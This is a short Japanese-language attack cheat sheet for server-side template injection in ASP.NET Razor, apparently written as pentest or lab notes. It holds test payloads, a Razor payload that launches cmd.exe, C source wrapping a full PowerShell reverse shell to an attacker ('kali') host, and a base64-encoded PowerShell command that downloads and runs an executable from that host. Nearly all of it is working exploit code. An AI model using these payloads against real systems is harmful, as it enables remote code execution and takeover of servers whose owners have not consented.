# Server Side Template Injection

Razor ASP.NET

## 脆弱性診断

    ``` c#
        //画面に 49 が返ってくればOK
        @{7*7}
        @() 
        @("{{code}}") 
        //下の方法でいろんなコマンドが実行できる
        @System.Diagnostics.Process.Start("cmd.exe","コマンド");
    ```

## Exploit

* reverse shell
  * msfvenomでexeファイルを作成
  * 下のcのソースを使ってexeを作成して転送(以外と万能)

```c
    #include <windows.h>
    #include <stdio.h>

    int main(){
        system("powershell.exe -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<kaliのIP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
        return 0;
    }
```

  * アプリケーション上で実行させるコマンドの生成

``` powershell
    $command = ' iwr -uri http://<kali ip>/XXX.exe -OutFile C:\Windows\Tasks\XXX.exe; C:\Windows\Tasks\XXX.exe'
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $encodedCommand = [Convert]::ToBase64String($bytes)
```

    
作成後はファイル転送してncで待ち受け

  * 作成したコードを貼り付けて実行

``` c#
    @System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc
    IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");
```
